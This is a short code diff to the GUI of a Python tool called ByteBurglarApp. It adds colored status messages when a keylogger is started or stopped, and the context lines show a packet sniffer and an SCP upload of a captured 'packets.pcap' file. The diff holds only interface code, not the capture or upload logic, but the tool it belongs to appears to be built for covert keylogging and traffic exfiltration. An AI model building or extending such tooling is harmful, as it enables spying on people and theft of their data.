@@ -37,6 +37,10 @@ class ByteBurglarApp:
         self.text = ctk.CTkTextbox(master=self.root, width=100, height=300, wrap='word', state='disabled')
         self.text.grid(row=5, column=0, padx=20, pady=10, sticky="nsew")
 
+        # Tag configuration for colored text
+        self.text.tag_config('success', foreground='cyan')
+        self.text.tag_config('info', foreground='white')
+
         self.create_button(BUTTON_STOP_SNIFFER_TEXT, self.deactivate_packet_sniffer).grid(
             row=4, column=0, padx=20, pady=10)
         
@@ -50,11 +54,13 @@ class ByteBurglarApp:
 
     def toggle_keylogger(self):
         if self.keylogger_thread is None or not self.keylogger_thread.is_alive():
+            self.update_textbox('Started Keylogger!\n', 'success')
             self.keylogger_thread = KeyloggerThread(app=self) # pass GUI reference
             self.keylogger_thread.start()
 
     def deactivate_keylogger(self):
         if self.keylogger_thread is not None:
+            self.update_textbox('Stopped Keylogger!\n', 'success')
             self.keylogger_thread.stop()
             self.keylogger_thread = None
 
@@ -70,9 +76,9 @@ class ByteBurglarApp:
         scp_uploader = SCPUploader()
         scp_uploader.upload_file('packets.pcap')
 
-    def update_textbox(self, data):
+    def update_textbox(self, data, tag='info'):
         self.text.configure(state='normal')  # Enable the textbox
-        self.text.insert('end', data)
+        self.text.insert('end', data, tag)
         self.text.see('end')  # Scroll to the end to show the latest data
         self.text.configure(state='disabled')  # Disable the textbox again
 
